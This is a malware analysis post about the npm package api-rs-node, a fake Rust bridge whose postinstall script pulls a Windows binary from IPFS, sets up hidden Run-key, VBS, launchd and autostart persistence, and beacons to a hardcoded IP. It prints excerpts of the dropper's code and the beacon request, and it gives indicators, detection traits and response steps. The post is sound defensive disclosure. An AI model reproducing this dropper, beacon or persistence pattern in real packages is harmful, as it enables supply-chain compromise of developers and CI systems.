---
title: "api-rs-node: a fake Rust↔Node bridge that ships its author's hard drive"
date: 2026-05-25
summary: "The npm package api-rs-node 4.3.1 advertises itself as a high-performance Rust bridge. Its postinstall pulls a Windows agent from IPFS, installs Run-key + VBS persistence, and beacons to 170.205.31.203:2026 — and the tarball quietly bundles the attacker's own config files."
packageName: api-rs-node
ecosystem: npm
---

A few hours after [system-user-identifier-cli](/discoveries/2026/05/system-user-identifier-cli/) was published from a throwaway gmail, a different gmail published `api-rs-node@4.3.1`. Same calendar day, different shape. The first package was 799 bytes and one stanza of bash; this one is a polished marketing README, a 292-line dropper, and a tarball that quietly carries the attacker's filesystem layout.

The cover is the README — a "Rust ↔ Node.js Bridge," a feature list with emojis, a benchmark table where pure JS loses to Rust by 7×, "Trading bots" and "Blockchain tooling" among the example use cases, and an MIT License copyright dated 2026. The install instructions still say `npm install your-package-name`. The `package.json` has no author, no license, no keywords, and one script:

<pre class="lang-js"><code>{
  <span class="tok-str">"name"</span>: <span class="tok-str">"api-rs-node"</span>,
  <span class="tok-str">"version"</span>: <span class="tok-str">"4.3.1"</span>,
  <span class="tok-str">"description"</span>: <span class="tok-str">"High-performance Rust modules for Node.js with native speed and clean DX."</span>,
  <span class="tok-str">"scripts"</span>: { <span class="tok-str">"postinstall"</span>: <span class="tok-str">"node clob.js"</span> },
  <span class="tok-str">"main"</span>: <span class="tok-str">"clob.js"</span>
}
</code></pre>

`clob.js` is where the work happens. It is well-structured, section-divided with comment banners, and unmistakably mid-development:

<pre class="lang-js"><code><span class="tok-kw">const</span> WIN_CID   = <span class="tok-str">'bafybeif3zkapj364ofnrvbty7oj5h5ufpxlp4s62usk3ulxrru35e3gssa'</span>;
<span class="tok-kw">const</span> MAC_URL   = <span class="tok-kw">null</span>; <span class="tok-com">// TODO: set macOS binary URL</span>
<span class="tok-kw">const</span> LINUX_URL = <span class="tok-kw">null</span>; <span class="tok-com">// TODO: set Linux binary URL</span>
</code></pre>

Only Windows is wired. The dropper tries four IPFS gateways for `WIN_CID` in sequence — a private Pinata gateway (`violet-tricky-quelea-562.mypinata.cloud`) with an optional `PINATA_GATEWAY_TOKEN` from the environment, then `cloudflare-ipfs.com`, `gateway.pinata.cloud`, and `ipfs.io` — and writes the result to `%LOCALAPPDATA%\windows defender host.exe`. The filename is the only masquerade. Persistence is wired for all three platforms anyway:

- **Windows:** writes a one-line VBS launcher (`oShell.Run "...exe", 0, False`) and a `HKCU\…\Run` value of `wscript.exe //nologo "<vbsPath>"`. Window style `0` hides any window type — no console flash, no taskbar entry.
- **macOS:** writes `~/Library/LaunchAgents/com.clob.agent.plist` with `RunAtLoad=true`, then calls `launchctl load`.
- **Linux:** writes `~/.config/autostart/clob.desktop`.

The mac and linux branches abort early without their URLs, but the persistence is already in place. This is a Windows campaign that intends to grow.

After the binary is dropped and registered, the script asks `api.ipify.org` for the host's public IP and POSTs it as a URL-encoded query parameter to a hardcoded IPv4, on a port that doubles as the year:

<pre class="lang-js"><code><span class="tok-kw">const</span> reportPath = <span class="tok-tmpl">`/api/urls?url=<span class="tok-tmpl-expr">${encodeURIComponent(ip)}</span>`</span>;
<span class="tok-kw">const</span> options = {
  hostname: <span class="tok-str">'170.205.31.203'</span>,
  port: 2026,
  path: reportPath,
  method: <span class="tok-str">'POST'</span>,
};
</code></pre>

The launcher is the standard hidden-spawn recipe: `spawn(..., { detached: true, stdio: 'ignore', windowsHide: true })` followed by `child.unref()`. A failed download silently `fs.unlink`s the partial file. A timed-out install `process.exit(0)`s without complaint. Every catch block is `catch (_) {}`.

## The leak

The tarball is seven files, not two. Alongside `clob.js`, `package.json`, and the README sit a `config/` directory with two JSON files and a `logs/` directory with two empty log files. None of them are referenced by the code. `config/meta_data.json` is the surprise:

<pre><code>{
  "version": "0.2.3",
  "abs_file_path_buf": "E:\\getting IP and check list\\clob-downloader\\config\\meta_data.json",
  "abs_folder_path_buf_for_templates": "E:\\getting IP and check list\\clob-downloader\\config\\templates",
  "all_volumes_with_information": [
    { "mount_point": "C:\\", "size": 317725863936, "total_read_bytes": 423897711616, ... },
    { "volume_name": "Programs", "mount_point": "D:\\", ... },
    { "volume_name": "Data",     "mount_point": "E:\\", ... },
    { "volume_name": "Etc",      "mount_point": "F:\\", ... }
  ],
  "current_running_os": "windows",
  "current_cpu_architecture": "x86_64",
  "user_home_dir": "C:\\Users\\mist"
}
</code></pre>

These files come from some Rust file-explorer scaffolding the author had open; `0.2.3` is that tool's version. When they ran `npm publish` from `E:\getting IP and check list\clob-downloader\`, the tool's bookkeeping went with it. The whole bundle records the project's working name (`clob-downloader`, inside a directory literally named `getting IP and check list`), the author's Windows username (`mist`), the four-volume NTFS layout of their drive, and lifetime read/write byte totals per volume — a fingerprint that survives reformats less than a serial number but more than an IP. The two log files and both config files are backdated to `Oct 26  1985`, a fixed-epoch tell from the same tooling.

The dropper was written carefully — section dividers, redirect handling, abortable promises, a 15-second install timeout. The packaging was not.

## Why this works

The execution surface is `postinstall`, which scanners do flag — but the `clob.js` it runs is structured like a normal native-module bootstrapper that downloads a prebuilt binary for the user's platform. That is what `node-pre-gyp`, `prebuild-install`, and dozens of other legitimate packages do at install time. The malicious version of that pattern doesn't need to look different; the binary just has to be the payload.

The IPFS staging is what makes delivery hard to disrupt. The CID is a content hash; whoever holds the underlying bytes can serve them from any gateway. Taking down the Pinata project removes one path; the bytes themselves remain pinned wherever the actor (or any sympathetic peer) keeps them, and `ipfs.io` will happily proxy them. There is no single domain to seize.

The `TODO`s and the leaked dev-env both say the same thing: this is iteration, not a finished campaign. The author published `4.3.0` at 17:36 UTC and `4.3.1` ninety minutes later — long enough to test, short enough to be the same sitting.

## Traits observed

The [Fallout report](https://lab.atomdrift.org/file/75a602995eeebbeee9c0af1e6e83f2384d5426cb64af78f4475f261add329410) returns malicious at probability 1.0. The high-severity [cleave-traits](https://codeberg.org/atomdrift/cleave-traits) group around four behaviours: dropper shape, hidden execution, persistence, and IPFS distribution.

|  | Trait | What it caught |
| --- | --- | --- |
| <span class="sev-dot hostile" title="hostile"></span> | `well-known/malware/supply-chain/netstruct::detached-hidden-node-dropper` | `detached:true` + `stdio:'ignore'` + `windowsHide:true` + `unref()` co-located |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/supply-chain/trojanized/app/package::obfuscated-dropper-exfiltration` | The whole dropper shape — `child_process` + `https.get` + `writeFileSync` |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/supply-chain/trojanized/library/hidden-dep::swallowed-loader-errors` | Every catch is `catch (_) {}` |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/command-and-control/infrastructure/dns-pin::dns-pinning-bypass` | Hardcoded IP `170.205.31.203`, no DNS resolution |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/command-and-control/dropper/node-bootstrap::extract-execute` | `execSync(chmod +x …)` then `spawn(exePath, …)` post-download |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/command-and-control/infrastructure/blockchain/multi-chain::ipfs-gateway` | Pinata + Cloudflare + ipfs.io fallback chain |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/persistence/login/registry/autostart::reg-add-run` | `reg add "HKCU\…\Run"` with VBS launcher |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/persistence/system/launchd/core::launchd` | LaunchAgents + RunAtLoad plist write |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/execution/interpreter/vbscript/interpreter::wscript-shell-create` | `CreateObject("WScript.Shell")` with `Run …, 0, False` |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/evasion/self-delete/file/script::empty-unlink-callback` | `fs.unlink(dest, () => {})` cleanup of partial downloads |
| <span class="sev-dot notable" title="notable"></span> | `objectives/supply-chain/metadata-anomaly/manifest/npm::no-repo-with-hooks` | Postinstall hook declared, no repository field |

The reverse-shell pattern from the prior post is absent here — this is a multi-stage build, not a beacon. What cleave flags is *bootstrap that should not be one*: a manifest with no metadata invoking a 292-line postinstall script that downloads a platform-specific binary from IPFS and registers it for autostart.

## Impact

`postinstall` runs whenever the package is installed — by a developer typing `npm i api-rs-node`, by CI installing transitively, by anything resolving a lockfile that includes it. The Windows branch drops `windows defender host.exe` into `%LOCALAPPDATA%`, registers it under HKCU Run via a hidden VBS launcher, spawns it detached, and beacons the host's public IP to `170.205.31.203:2026`. The dropped binary is whatever the actor pinned at the CID at the time — content-addressed, but the content is the actor's to choose. The mac and linux branches abort early today; tomorrow they may not.

## Likely actor

Two versions in ninety minutes, from a fresh gmail, with no other published packages:

| Field | Value |
| --- | --- |
| Publisher | `shinydv412 <shinydv412@gmail.com>` |
| `4.3.0` published | `2026-05-25T17:36:29Z` |
| `4.3.1` published | `2026-05-25T19:05:48Z` |
| Files in tarball | 7 (`clob.js`, `package.json`, `README.md`, `config/×2`, `logs/×2`) |
| Author host (from bundled `meta_data.json`) | Windows x86_64, username `mist`, project dir `E:\getting IP and check list\clob-downloader` |

Higher craftsmanship than the prior post — section comments, redirect handling, multi-gateway fallback, three-platform persistence wiring — paired with novice OPSEC. The package ships the author's machine fingerprint, the tooling version they built it with, the working name of their project, and even their lifetime per-volume disk read/write totals. A serious operator would have published from a clean directory.

The Pinata CID, the `2026` port, the unfinished `*_URL` constants, and the unpolished README all read as one person's first or second iteration on a stager they intend to refine. The dropper is more dangerous than `system-user-identifier-cli`'s reverse shell — quieter, persistent, and content-addressed — and the author is more careless than the one who shipped the shell.

## Indicators

| Type | Value |
| --- | --- |
| Package | `api-rs-node@4.3.1` (npm), also `4.3.0` |
| npm page | [npmjs.com/package/api-rs-node](https://www.npmjs.com/package/api-rs-node) |
| Tarball SHA-256 | `75a602995eeebbeee9c0af1e6e83f2384d5426cb64af78f4475f261add329410` |
| `clob.js` SHA-256 | `5839ea1afa6dc1237da3a9c59668b1e4e21e5dde2d2827daecf43a83400a7023` |
| `package.json` SHA-256 | `00ec02844d57931db3abb8011ecc9aba3fa7165c701c7a60065e1d63abe53c44` |
| C2 endpoint | `170.205.31.203:2026` (HTTP `POST /api/urls?url=<public-ip>:80`) |
| IPFS payload CID | `bafybeif3zkapj364ofnrvbty7oj5h5ufpxlp4s62usk3ulxrru35e3gssa` |
| Private gateway | `violet-tricky-quelea-562.mypinata.cloud` |
| Public-IP lookup | `api.ipify.org` |
| Dropped Windows file | `%LOCALAPPDATA%\windows defender host.exe` |
| Run key | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\clob` |
| Windows launcher | `%LOCALAPPDATA%\windows defender host-launcher.vbs` |
| macOS plist | `~/Library/LaunchAgents/com.clob.agent.plist` |
| Linux autostart | `~/.config/autostart/clob.desktop` |
| Publisher | `shinydv412 <shinydv412@gmail.com>` |

## Response

Search npm caches, CI logs, and `%LOCALAPPDATA%` (and the mac/linux paths above) for the dropped filenames. In egress telemetry: outbound to `170.205.31.203:2026`, to `api.ipify.org`, and to the four IPFS gateways above carrying that CID. Rotate any credentials available to a user that ran `npm install` on a Windows host that resolved `api-rs-node` since 2026-05-25. Treat the binary at the CID as untrusted; pull it for analysis from a host that does not share an identity with anything else you care about.

The full trait list and raw analysis live in the [Fallout report](https://lab.atomdrift.org/file/75a602995eeebbeee9c0af1e6e83f2384d5426cb64af78f4475f261add329410); registry metadata came from `https://registry.npmjs.org/api-rs-node` and the source from the published tarball.
